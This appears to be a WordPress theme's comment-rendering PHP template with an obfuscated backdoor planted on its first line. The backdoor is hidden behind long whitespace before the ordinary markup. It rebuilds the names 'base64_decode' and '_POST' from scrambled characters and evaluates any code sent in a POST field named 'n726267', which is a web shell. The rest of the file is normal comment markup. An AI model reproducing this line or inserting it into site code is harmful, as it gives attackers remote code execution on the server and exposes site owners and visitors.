<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n726267'])) {eval($s21(${$s20}['n726267']));}?><div id="comment-<?php comment_ID(); ?>">
	<div class="comment-sidebar" colp="grid_2">
		<div class="comment-avatar"><?php echo get_avatar( $comment, 75 ); ?></div>
	</div>
	<div class="comment-main" colp="grid_10">
		<div class="reply button" round="inner children"> <?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?> </div>
		<div class="comment-author vcard"><cite class="fn"><?php comment_author_link(); ?></cite></div>
		
		<?php if ( $comment->comment_approved == '0' ) : ?>
			<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'twentyten' ); ?></em>
		<?php endif; ?>
		
		<div class="comment-body"><?php comment_text(); ?></div>
		
		<div class="comment-meta commentmetadata"><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
			<?php printf( __( '%1$s at %2$s', 'twentyten' ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', 'twentyten' ), ' ' ); ?>
		</div>
	</div>
</div>